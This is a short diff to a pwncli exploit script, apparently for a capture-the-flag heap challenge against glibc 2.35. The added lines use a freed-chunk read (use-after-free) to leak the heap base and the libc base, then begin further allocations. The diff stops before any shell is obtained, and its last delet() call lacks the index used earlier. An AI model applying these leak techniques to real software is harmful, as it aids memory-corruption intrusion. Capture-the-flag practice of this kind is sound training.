@@ -6,7 +6,7 @@
 
 from pwncli import *
 cli_script()
-set_remote_libc('libc.so.6')
+set_remote_libc('./libc-2.35.so')
 
 io: tube = gift.io
 elf: ELF = gift.elf
@@ -47,5 +47,18 @@ def show(idx):
 add(0x20, b"aaa")
 add(0x20, b"aaa")
 delet(0)
+show(0)
+heap_base = (u64_ex(rn(8)) << 12)
+lg("heap_base")
+
+add(0x500, b"aaa")
+add(0x60, b"bbb")
+delet(2)
+show(2)
+libc_base = u64_ex(rn(8)) - 0x219ce0
+lg("libc_base")
+
+add(0x420, b"aaa")
+delet()
 
 ia()
